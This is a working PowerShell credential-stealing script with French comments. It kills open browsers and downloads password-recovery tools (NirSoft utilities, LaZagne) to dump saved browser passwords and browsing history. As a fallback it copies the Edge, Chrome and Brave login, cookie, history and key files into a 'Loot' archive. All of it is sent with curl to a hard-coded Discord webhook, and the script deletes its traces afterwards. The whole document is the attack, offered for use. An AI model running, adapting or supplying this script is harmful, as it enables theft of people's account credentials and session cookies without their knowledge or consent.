$wh="https://discord.com/api/webhooks/1467523812563357737/NtrM4DGzR7UGo0mOZ4i2-Y65OzXuto6PCbm-T8K67_JoFGV_rElaAwtptxjQJbPGH5i6"

# === FONCTION D'ENVOI ===
function Send-Results {
    param($file, $method)
    if ((Test-Path $file) -and ((Get-Item $file).Length -gt 50)) {
        curl.exe -F "file=@$file" -F "content=**✅ SUCCESS - Method: $method | PC: $env:COMPUTERNAME**" $wh
        return $true
    }
    return $false
}

# === KILL BROWSERS ===
taskkill /F /IM msedge.exe,chrome.exe,brave.exe,firefox.exe 2>$null
Start-Sleep -Seconds 2

$success = $false

# ========================================
# MÉTHODE 1: EdgePassView (NirSoft)
# ========================================
Write-Host "[1/6] Trying EdgePassView..."
try {
    Invoke-WebRequest "https://www.nirsoft.net/toolsdownload/edgepassview.zip" -OutFile "$env:TEMP\ep.zip" -UseBasicParsing -TimeoutSec 15 -ErrorAction Stop
    Expand-Archive "$env:TEMP\ep.zip" "$env:TEMP\ep" -Force
    $ep = "$env:TEMP\ep\EdgePassView.exe"
    
    & $ep /stext "$env:TEMP\result1.txt"
    Start-Sleep 3
    
    if (Send-Results "$env:TEMP\result1.txt" "EdgePassView") {
        $success = $true
    }
    
    Remove-Item "$env:TEMP\ep.zip","$env:TEMP\ep" -Recurse -Force -EA 0
} catch {
    Write-Host "EdgePassView failed: $_"
}

if ($success) { 
    Remove-Item "$env:TEMP\result*.txt" -Force -EA 0
    exit 
}

# ========================================
# MÉTHODE 2: WebBrowserPassView (Tous navigateurs)
# ========================================
Write-Host "[2/6] Trying WebBrowserPassView..."
try {
    Invoke-WebRequest "https://www.nirsoft.net/toolsdownload/webbrowserpassview.zip" -OutFile "$env:TEMP\wb.zip" -UseBasicParsing -TimeoutSec 15 -ErrorAction Stop
    Expand-Archive "$env:TEMP\wb.zip" "$env:TEMP\wb" -Force
    $wb = "$env:TEMP\wb\WebBrowserPassView.exe"
    
    & $wb /stext "$env:TEMP\result2.txt"
    Start-Sleep 3
    
    if (Send-Results "$env:TEMP\result2.txt" "WebBrowserPassView") {
        $success = $true
    }
    
    Remove-Item "$env:TEMP\wb.zip","$env:TEMP\wb" -Recurse -Force -EA 0
} catch {
    Write-Host "WebBrowserPassView failed: $_"
}

if ($success) { 
    Remove-Item "$env:TEMP\result*.txt" -Force -EA 0
    exit 
}

# ========================================
# MÉTHODE 3: BrowsingHistoryView (Historique)
# ========================================
Write-Host "[3/6] Trying BrowsingHistoryView..."
try {
    Invoke-WebRequest "https://www.nirsoft.net/toolsdownload/browsinghistoryview.zip" -OutFile "$env:TEMP\bh.zip" -UseBasicParsing -TimeoutSec 15 -ErrorAction Stop
    Expand-Archive "$env:TEMP\bh.zip" "$env:TEMP\bh" -Force
    $bh = "$env:TEMP\bh\BrowsingHistoryView.exe"
    
    & $bh /VisitTimeFilterType 1 /VisitTimeFilterValue 30 /stext "$env:TEMP\result3.txt"
    Start-Sleep 3
    
    if (Send-Results "$env:TEMP\result3.txt" "BrowsingHistoryView") {
        $success = $true
    }
    
    Remove-Item "$env:TEMP\bh.zip","$env:TEMP\bh" -Recurse -Force -EA 0
} catch {
    Write-Host "BrowsingHistoryView failed: $_"
}

if ($success) { 
    Remove-Item "$env:TEMP\result*.txt" -Force -EA 0
    exit 
}

# ========================================
# MÉTHODE 4: ChromePass (Chrome/Edge)
# ========================================
Write-Host "[4/6] Trying ChromePass..."
try {
    Invoke-WebRequest "https://www.nirsoft.net/toolsdownload/chromepass.zip" -OutFile "$env:TEMP\cp.zip" -UseBasicParsing -TimeoutSec 15 -ErrorAction Stop
    Expand-Archive "$env:TEMP\cp.zip" "$env:TEMP\cp" -Force
    $cp = "$env:TEMP\cp\ChromePass.exe"
    
    & $cp /stext "$env:TEMP\result4.txt"
    Start-Sleep 3
    
    if (Send-Results "$env:TEMP\result4.txt" "ChromePass") {
        $success = $true
    }
    
    Remove-Item "$env:TEMP\cp.zip","$env:TEMP\cp" -Recurse -Force -EA 0
} catch {
    Write-Host "ChromePass failed: $_"
}

if ($success) { 
    Remove-Item "$env:TEMP\result*.txt" -Force -EA 0
    exit 
}

# ========================================
# MÉTHODE 5: LaZagne (Tout-en-un)
# ========================================
Write-Host "[5/6] Trying LaZagne..."
try {
    Invoke-WebRequest "https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe" -OutFile "$env:TEMP\laz.exe" -UseBasicParsing -TimeoutSec 20 -ErrorAction Stop
    
    & "$env:TEMP\laz.exe" browsers -oN > "$env:TEMP\result5.txt"
    Start-Sleep 3
    
    if (Send-Results "$env:TEMP\result5.txt" "LaZagne") {
        $success = $true
    }
    
    Remove-Item "$env:TEMP\laz.exe" -Force -EA 0
} catch {
    Write-Host "LaZagne failed: $_"
}

if ($success) { 
    Remove-Item "$env:TEMP\result*.txt" -Force -EA 0
    exit 
}

# ========================================
# MÉTHODE 6: Exfiltration brute des DBs (fallback ultime)
# ========================================
Write-Host "[6/6] Trying raw database exfiltration..."
try {
    cd $env:TEMP
    Remove-Item Loot -Recurse -Force -EA 0
    mkdir Loot -Force | Out-Null
    
    # Edge
    if (Test-Path "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data") {
        Copy-Item "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data" "Loot\Edge_Passwords.db" -EA 0
    }
    if (Test-Path "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State") {
        Copy-Item "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State" "Loot\Edge_Local_State" -EA 0
    }
    if (Test-Path "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\History") {
        Copy-Item "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\History" "Loot\Edge_History.db" -EA 0
    }
    if (Test-Path "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Cookies") {
        Copy-Item "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Cookies" "Loot\Edge_Cookies.db" -EA 0
    }
    
    # Chrome
    if (Test-Path "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data") {
        Copy-Item "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data" "Loot\Chrome_Passwords.db" -EA 0
    }
    if (Test-Path "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State") {
        Copy-Item "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State" "Loot\Chrome_Local_State" -EA 0
    }
    
    # Brave
    if (Test-Path "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Login Data") {
        Copy-Item "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Login Data" "Loot\Brave_Passwords.db" -EA 0
    }
    if (Test-Path "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Local State") {
        Copy-Item "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Local State" "Loot\Brave_Local_State" -EA 0
    }
    
    # Compresser
    $fileCount = (Get-ChildItem Loot).Count
    
    if ($fileCount -gt 0) {
        Compress-Archive -Path "Loot\*" -DestinationPath "loot.zip" -Force
        
        curl.exe -F "file=@loot.zip" -F "content=**⚠️ FALLBACK - Raw DB files ($fileCount files) - $env:COMPUTERNAME - Decrypt with your previous Python script**" $wh
        
        $success = $true
    }
    
    Remove-Item "loot.zip","Loot" -Recurse -Force -EA 0
} catch {
    Write-Host "Raw exfiltration failed: $_"
}

# ========================================
# SI TOUT A ÉCHOUÉ
# ========================================
if (!$success) {
    $errorReport = @"
❌ ALL METHODS FAILED on $env:COMPUTERNAME

Computer: $env:COMPUTERNAME
User: $env:USERNAME
Edge installed: $(Test-Path "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data")
Chrome installed: $(Test-Path "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data")
PowerShell version: $($PSVersionTable.PSVersion)

Possible reasons:
- No passwords saved in browsers
- Windows Defender blocked NirSoft tools
- Network download failed
- PowerShell execution policy blocked scripts
"@
    
    $errorReport | Out-File "$env:TEMP\error_report.txt"
    curl.exe -F "file=@$env:TEMP\error_report.txt" -F "content=**❌ TOTAL FAILURE - $env:COMPUTERNAME**" $wh
    Remove-Item "$env:TEMP\error_report.txt" -Force -EA 0
}

# Cleanup final
Remove-Item "$env:TEMP\result*.txt","$env:TEMP\*.zip" -Force -EA 0
